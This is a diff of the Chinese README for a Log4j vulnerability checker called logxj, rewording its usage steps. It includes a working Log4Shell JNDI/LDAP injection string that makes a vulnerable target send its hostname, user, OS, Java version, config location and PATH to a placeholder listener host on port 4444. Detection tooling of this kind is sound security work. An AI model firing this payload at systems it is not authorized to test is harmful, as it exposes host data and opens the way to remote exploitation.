@@ -31,16 +31,16 @@
 
 ## 用法
 
-1. 找一台服务器作为logxj服务端, 假设ip是LOGXJ_SERVER, 开启TCP监听服务, 监听4444端口, 则命令如下:
+1. 找一台服务器，搭建```LogXj安全服务端```, 命令如下:
 ```
 python logxj.py
 ```
 
-2. 安全人员将下述```LOGXJ POC```发送给使用了log4j的目标(java应用): 
+2. 以下是我构造的```LOGXJ POC```，需要先手动把里面的```LOGXJ_SERVER```替换为```LogXj安全服务端的IP```，然后把它发送给使用了log4j的目标: 
 ```shell
 ${jndi:ldap://LOGXJ_SERVER:4444/\nFound Log4j vuln!\nDate\t:${date:yyyy-MM-dd HH:mm:ss}\nHostname:${hostName}\nConf dir:${log4j:configLocation:-}\nOs ver\t:${java:os}\nJava ver:${java:version}\nUser\t:${env:USER:-}${env:USERNAME:-}\nIsTomcat:${env:CATALINA_BASE:-False}\nPATH\t:${env:PATH:-}\n\nEnd}
 ```
 
-3. 此时观察logxj服务端的控制台:
+3. 此时观察```LogXj安全服务端```的控制台:
 - 若收到请求, 则说明目标存在log4j漏洞.
-- 若无, 则说明可能暂无风险.
+- 若无, 则说明可能暂无风险. 并且可以进一步代码审计确认是否真的无风险.
